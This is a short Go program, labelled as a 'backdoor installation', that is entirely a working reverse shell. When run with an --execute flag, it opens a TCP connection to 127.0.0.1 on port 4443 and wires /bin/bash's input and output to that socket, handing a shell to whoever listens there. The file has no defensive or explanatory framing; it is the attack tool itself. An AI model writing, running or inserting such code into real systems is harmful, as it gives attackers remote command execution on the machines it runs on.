package main

import (
	"flag"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	execute := flag.Bool("execute", false, "Execute the backdoor installation")

	flag.Parse()

	if *execute {
		fmt.Println("Executing backdoor installation")
		installation()
	} else {
		fmt.Println("Use --execute flag to run the backdoor installation")
		flag.PrintDefaults()
	}
}

func installation() {
	// Target IP and port
	targetIP := "127.0.0.1"
	targetPort := "4443"

	// Connect
	conn, err := net.Dial("tcp", targetIP+":"+targetPort)

	if err != nil {
		fmt.Println("Error connecting: ", err)
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err = cmd.Run()

	if err != nil {
		fmt.Println("Error running command:", err)
	}
}
